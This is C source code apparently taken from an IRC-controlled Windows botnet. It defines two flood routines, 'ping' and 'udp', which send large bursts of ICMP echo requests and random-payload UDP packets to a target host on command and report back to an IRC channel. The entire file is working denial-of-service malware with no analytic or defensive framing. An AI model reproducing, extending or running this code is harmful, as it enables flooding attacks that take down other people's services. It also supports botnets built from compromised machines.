#include "includes.h"
#include "functions.h"
#include "externs.h"

#define MAXPINGSIZE 65500

#ifndef NO_PING
//  function for sending pings
DWORD WINAPI ping(LPVOID param)
{
	char sendbuf[IRCLINE], pbuff[MAXPINGSIZE];

	unsigned long ip;

	PINGFLOOD ping = *((PINGFLOOD *)param);
	PINGFLOOD *pings = (PINGFLOOD *)param;
	pings->gotinfo = true;

	HANDLE icmp = (HANDLE)fIcmpCreateFile();

	ip = ResolveAddress(ping.host);
	if (ip == INADDR_NONE || icmp == INVALID_HANDLE_VALUE) {
		sprintf(sendbuf,"[PING]: Error sending pings to %s.", ping.host);
		if (!ping.silent) irc_privmsg(ping.sock, ping.chan, sendbuf, ping.notice);
		addlog(sendbuf);

		clearthread(ping.threadnum);

		ExitThread(EXIT_FAILURE);
	}

	ICMP_ECHO_REPLY reply;
	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > MAXPINGSIZE) 
		ping.size = MAXPINGSIZE;
	if (ping.delay < 1) 
		ping.delay = 1;
	for (int i = 0; i < ping.num; i++)
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	fIcmpCloseHandle(icmp);

	sprintf(sendbuf,"[PING]: Finished sending pings to %s.", ping.host);
	if (!ping.silent) irc_privmsg(ping.sock, ping.chan, sendbuf, ping.notice);
	addlog(sendbuf);

	clearthread(ping.threadnum);

	ExitThread(EXIT_SUCCESS);
}
#endif

#ifndef NO_UDP
#define MAXUDPPORT 65535

// function for sending udp packets
DWORD WINAPI udp(LPVOID param)
{
	PINGFLOOD udp = *((PINGFLOOD *)param);
	PINGFLOOD *udps = (PINGFLOOD *)param;
	udps->gotinfo = true;

	char sendbuf[IRCLINE], pbuff[MAXPINGSIZE];
	int i;

	SOCKET usock = fsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = ((udp.port == 0)?(fhtons((unsigned short)brandom(1,MAXPINGSIZE))):(fhtons((unsigned short)udp.port)));
	ssin.sin_addr.s_addr = ResolveAddress(udp.host);

	if (ssin.sin_addr.s_addr == INADDR_NONE || usock == INVALID_SOCKET) {
		sprintf(sendbuf,"[UDP]: Error sending pings to %s.", udp.host);
		if (!udp.silent) irc_privmsg(udp.sock, udp.chan, sendbuf, udp.notice);
		addlog(sendbuf);

		clearthread(udp.threadnum);

		ExitThread(EXIT_FAILURE);
	}

	if (udp.port < 1) 
		udp.port = 1;
	if (udp.port > MAXUDPPORT) 
		udp.port = MAXUDPPORT;
	udp.num = udp.num / 10;
	if (udp.delay == 0) 
		udp.delay = 1;

	for (i = 0; i < udp.size; i++) 
		pbuff[i] = (char)(rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			fsendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) 
			ssin.sin_port = fhtons((unsigned short)(brandom(1,MAXPINGSIZE)));
	}
	sprintf(sendbuf,"[UDP]: Finished sending packets to %s.", udp.host);
	if (!udp.silent) irc_privmsg(udp.sock, udp.chan, sendbuf, udp.notice);
	addlog(sendbuf);

	clearthread(udp.threadnum);

	ExitThread(EXIT_SUCCESS);
}
#endif
